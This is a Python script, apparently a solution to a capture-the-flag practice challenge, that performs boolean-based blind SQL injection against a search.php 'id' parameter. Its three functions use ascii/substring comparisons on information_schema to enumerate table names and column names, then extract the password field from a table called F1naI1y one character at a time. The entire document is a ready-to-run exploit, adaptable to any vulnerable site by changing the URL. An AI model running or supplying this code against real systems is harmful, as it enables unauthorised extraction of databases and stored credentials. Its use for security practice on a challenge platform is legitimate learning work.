#sql盲注

import requests
import time

def tables():
    url='http://d10903f7-130a-444f-a11f-c0ce4b9d3b9b.node4.buuoj.cn:81/search.php?id='
    table=''
    for i in range(1,30):
        for j in range(32,127):
            payload = '(ascii(substring((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{0},1))={1})'.format(i,j)
            res = requests.get(url=url+payload)
            if 'NO' in res.text:
                table += chr(j)
                print(table)
                break
            time.sleep(0.1)

def columns():
    url = 'http://d10903f7-130a-444f-a11f-c0ce4b9d3b9b.node4.buuoj.cn:81/search.php?id='
    column = ''
    for i in range(1, 30):
        for j in range(32, 127):
            payload = '(ascii(substring((select(group_concat(column_name))from(information_schema.columns)where(table_name="F1naI1y")),{0},1))={1})'.format(i, j)
            res = requests.get(url=url + payload)
            if 'NO' in res.text:
                column += chr(j)
                print(column)
                break
            time.sleep(0.1)

def flag():
    url = 'http://d10903f7-130a-444f-a11f-c0ce4b9d3b9b.node4.buuoj.cn:81/search.php?id='
    flag = ''
    s=requests.session()
    for i in range(170, 250):
        for j in range(32, 127):
            payload = '(ascii(substring((select(group_concat(password))from(F1naI1y)),{0},1))={1})'.format(i, j)
            try:
                res = s.get(url=url + payload)
                if 'NO' in res.text:
                    flag += chr(j)
                    print(flag)
                    break
            except Exception as e:
                print(e)
                j=j-1
                break
            time.sleep(0.05)

if __name__ == '__main__':
    flag()
